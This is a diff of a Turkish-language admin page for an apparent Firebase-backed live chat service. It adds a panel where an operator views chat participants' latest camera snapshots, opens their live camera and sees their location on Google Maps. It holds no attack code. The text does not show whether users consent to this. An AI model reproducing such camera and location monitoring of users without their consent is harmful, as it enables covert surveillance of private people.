@@ -8,7 +8,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="styles.css?v=55" />
+  <link rel="stylesheet" href="styles.css?v=67" />
 </head>
 <body class="admin-body">
   <header class="site-header admin-top">
@@ -105,6 +105,30 @@
             <h2 id="thread-title">Bir sohbet seçin</h2>
             <p id="thread-meta">Sol listeden canlı oturumları izleyin.</p>
           </header>
+          <div class="admin-media-dock" id="admin-media-dock" hidden>
+            <div class="admin-media-dock-head">
+              <strong>Kamera &amp; konum</strong>
+              <span id="dock-status-pill" class="dock-pill">—</span>
+            </div>
+            <div class="admin-media-dock-grid">
+              <div class="admin-media-card">
+                <p class="admin-media-label">Kamera</p>
+                <img id="dock-snapshot" class="admin-dock-snapshot" alt="Son kamera fotoğrafı" hidden />
+                <p id="dock-cam-text" class="admin-media-text">Henüz yok</p>
+                <div class="admin-media-actions">
+                  <a class="btn btn-ghost" id="dock-snapshot-link" href="#" target="_blank" rel="noopener" hidden>Fotoğrafı aç</a>
+                  <button type="button" class="btn btn-primary" id="dock-open-camera-btn" hidden>Canlı kamerayı aç</button>
+                </div>
+              </div>
+              <div class="admin-media-card">
+                <p class="admin-media-label">Konum</p>
+                <p id="dock-loc-text" class="admin-media-text">Henüz yok</p>
+                <div class="admin-media-actions">
+                  <a class="btn btn-ghost" id="dock-loc-maps" href="#" target="_blank" rel="noopener" hidden>Google Maps</a>
+                </div>
+              </div>
+            </div>
+          </div>
           <div class="admin-thread-tools">
             <button type="button" class="btn btn-ghost" id="export-chat-btn" disabled>Sohbeti dışa aktar</button>
             <button type="button" class="btn btn-danger" id="clear-chat-btn" disabled>Sohbeti temizle</button>
@@ -179,6 +203,8 @@
       </header>
       <p class="admin-popup-help" id="camera-status">Bekleniyor…</p>
       <video id="admin-remote-video" class="admin-remote-video" autoplay playsinline muted></video>
+      <img id="admin-snapshot-preview" class="admin-snapshot-preview" alt="Son kamera fotoğrafı" hidden />
+      <a class="btn btn-ghost" id="admin-snapshot-link" href="#" target="_blank" rel="noopener" hidden>Son fotoğrafı aç</a>
       <div class="admin-live-location" id="admin-live-location" hidden>
         <p class="admin-live-location-label">Canlı konum</p>
         <p class="admin-live-location-coords" id="admin-location-text">Konum bekleniyor…</p>
@@ -192,8 +218,8 @@
     </div>
   </div>
 
-  <script src="firebase-config.js?v=55"></script>
-  <script type="module" src="chat-sync.js?v=55"></script>
-  <script type="module" src="admin.js?v=55"></script>
+  <script src="firebase-config.js?v=67"></script>
+  <script type="module" src="chat-sync.js?v=67"></script>
+  <script type="module" src="admin.js?v=67"></script>
 </body>
 </html>
